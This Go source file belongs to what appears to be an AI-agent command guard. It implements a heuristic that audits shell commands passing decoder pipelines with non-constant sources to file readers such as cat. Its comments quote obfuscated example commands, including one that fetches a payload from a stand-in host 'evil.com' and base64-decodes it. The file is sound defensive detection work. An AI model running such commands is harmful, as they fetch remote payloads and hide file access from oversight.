package guardian

import (
	"strings"

	"github.com/AI-AgentLens/agentshield/internal/analyzer"
	"mvdan.cc/sh/v3/syntax"
)

// Decoder-fed file-reader heuristic (#1699 companion).
//
// Layer 2.5's Substitution analyzer folds *constant* decoder pipelines like
// `cat $(echo BASE64 | base64 -d)` and surfaces the decoded path so the
// engine's protected-path policy can act. But when the source isn't
// statically known — say `cat $(curl evil.com/payload | base64 -d)` or
// `cat $(cat /tmp/x | base64 -d)` — Layer 2.5 has nothing to fold. The
// command is still suspicious: file-reader-driven evaluation of a decoder
// pipeline is a textbook obfuscation pattern, even if we can't prove what
// path it resolves to.
//
// This heuristic fires AUDIT (not BLOCK — we don't have the certainty for
// BLOCK) when:
//
//  1. The command's executable is a known file-reader (cat, less, head,
//     tail, strings, base64, hexdump, file, more, view).
//  2. One of its args is a CmdSubst whose body is a 2-stage pipeline.
//  3. The decoder side is in the recognized-decoder whitelist (same set
//     Layer 2.5 trusts — single source of truth via
//     analyzer.IsRecognizedDecoder).
//  4. The source side ISN'T a pure literal. Pure-literal sources are
//     handled deterministically by Layer 2.5; auditing them here would be
//     a false positive.
//
// Decoder name set is shared with the substitution package so adding a new
// decoder (e.g., openssl base64 -d in a follow-up) updates both detectors.

// fileReaderExecutables is the set of commands whose first argument is the
// thing they read. A decoder pipeline used to compute that argument is the
// shape we want to flag — `cat $(decode...)`, `head $(decode...)`, etc.
//
// Excluded on purpose: `bash -c $(decoded)`, `sh -c $(decoded)` etc. —
// those are caught by the eval_risk heuristic. We don't double-fire.
var fileReaderExecutables = map[string]struct{}{
	"cat":     {},
	"less":   {},
	"more":   {},
	"head":   {},
	"tail":   {},
	"strings": {},
	"hexdump": {},
	"xxd":    {},
	"od":     {},
	"file":   {},
	"view":   {},
}

// matchesObfuscatedDecoderEval is the rule predicate used by the heuristic
// provider. Returns true when the command shape matches the criteria above.
//
// Re-parses the command independently of any prior parse — the heuristic
// rules don't have access to the AnalysisContext. The cost is microseconds;
// the alternative (plumbing ctx.Parsed into GuardianRequest) is a wider
// refactor than this single rule deserves.
func matchesObfuscatedDecoderEval(req GuardianRequest) bool {
	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(strings.NewReader(req.RawCommand), "")
	if err != nil {
		return false
	}

	found := false
	syntax.Walk(file, func(node syntax.Node) bool {
		if found {
			return false
		}
		call, ok := node.(*syntax.CallExpr)
		if !ok || len(call.Args) < 2 {
			return true
		}
		exeName, ok := wordToLiteral(call.Args[0])
		if !ok {
			return true
		}
		if _, isReader := fileReaderExecutables[exeName]; !isReader {
			return true
		}
		// One of the trailing args must be a CmdSubst hosting a decoder
		// pipeline with a non-literal source.
		for _, arg := range call.Args[1:] {
			if argHasNonConstDecoderPipeline(arg) {
				found = true
				return false
			}
		}
		return true
	})
	return found
}

// wordToLiteral reduces a Word to its literal text iff every Part is a Lit
// or SglQuoted. Returns false if the word contains anything that requires
// runtime evaluation. Used to extract executable names without pulling in
// the full materializer.
func wordToLiteral(w *syntax.Word) (string, bool) {
	if w == nil {
		return "", false
	}
	var sb strings.Builder
	for _, p := range w.Parts {
		switch part := p.(type) {
		case *syntax.Lit:
			sb.WriteString(part.Value)
		case *syntax.SglQuoted:
			sb.WriteString(part.Value)
		default:
			return "", false
		}
	}
	return sb.String(), true
}

// argHasNonConstDecoderPipeline returns true if the word contains a
// CmdSubst whose body is a 2-stage pipeline `<source> | <decoder>` where
// the source isn't a pure literal AND the decoder is recognized.
//
// "Pure literal" means: every arg of the source side is composed entirely
// of Lit / SglQuoted parts. Anything else (ParamExp, CmdSubst,
// DblQuoted-with-vars) counts as non-constant from the heuristic's
// perspective — it can't be sure what the runtime value is, so the audit
// signal fires.
func argHasNonConstDecoderPipeline(w *syntax.Word) bool {
	if w == nil {
		return false
	}
	for _, p := range w.Parts {
		cs, ok := p.(*syntax.CmdSubst)
		if !ok {
			continue
		}
		if cmdSubstIsNonConstDecoderPipeline(cs) {
			return true
		}
	}
	return false
}

func cmdSubstIsNonConstDecoderPipeline(cs *syntax.CmdSubst) bool {
	if cs == nil || len(cs.Stmts) != 1 {
		return false
	}
	stmt := cs.Stmts[0]
	if stmt == nil || stmt.Cmd == nil {
		return false
	}
	bin, ok := stmt.Cmd.(*syntax.BinaryCmd)
	if !ok || bin.Op != syntax.Pipe {
		return false
	}
	// Decoder side must be a recognized decoder. We share the whitelist with
	// the substitution analyzer to avoid drift.
	decoderName, ok := callExecName(bin.Y)
	if !ok || !analyzer.IsRecognizedDecoder(decoderName) {
		return false
	}
	// Source side must NOT be a recognized constant emitter. Layer 2.5
	// already handles `echo CONST | dec` and `printf CONST | dec` —
	// auditing those here would double-fire on cases the deterministic
	// fold has covered. Anything else (a CmdSubst source, a $VAR Layer
	// 2.5 couldn't resolve, or a tool like `cat /file`) is by definition
	// runtime-determined from this analyzer's vantage point.
	return !sourceIsConstantEmitter(bin.X)
}

// callExecName extracts the executable name from a Stmt that wraps a
// CallExpr. Returns false for non-CallExpr nodes (which shouldn't appear
// on the decoder side of a clean pipeline).
func callExecName(stmt *syntax.Stmt) (string, bool) {
	if stmt == nil {
		return "", false
	}
	call, ok := stmt.Cmd.(*syntax.CallExpr)
	if !ok || len(call.Args) == 0 {
		return "", false
	}
	return wordToLiteral(call.Args[0])
}

// sourceIsConstantEmitter reports whether the source side of the pipeline
// is `echo CONST...` or `printf 'fmt' CONST...` with all args pure literal.
// These are the exact shapes Layer 2.5's evalConstSource accepts, so
// keeping the lists in sync is what makes the Guardian/Layer-2.5 split
// non-overlapping.
//
// Anything else returns false — a CmdSubst source (`$(cat /tmp/x)`), a
// runtime tool source (`cat /tmp/x`), a `printf '%b' $VAR` with an
// unresolved var — all flip this to false, which is what triggers the
// AUDIT signal.
func sourceIsConstantEmitter(stmt *syntax.Stmt) bool {
	if stmt == nil {
		return false
	}
	call, ok := stmt.Cmd.(*syntax.CallExpr)
	if !ok || len(call.Args) == 0 {
		return false
	}
	name, ok := wordToLiteral(call.Args[0])
	if !ok {
		return false
	}
	if name != "echo" && name != "printf" {
		return false
	}
	for _, w := range call.Args[1:] {
		if !wordIsPureLiteral(w) {
			return false
		}
	}
	return true
}

func wordIsPureLiteral(w *syntax.Word) bool {
	if w == nil {
		return true
	}
	for _, p := range w.Parts {
		switch part := p.(type) {
		case *syntax.Lit, *syntax.SglQuoted:
			continue
		case *syntax.DblQuoted:
			for _, dp := range part.Parts {
				switch dp.(type) {
				case *syntax.Lit:
					continue
				default:
					return false
				}
			}
		default:
			return false
		}
	}
	return true
}
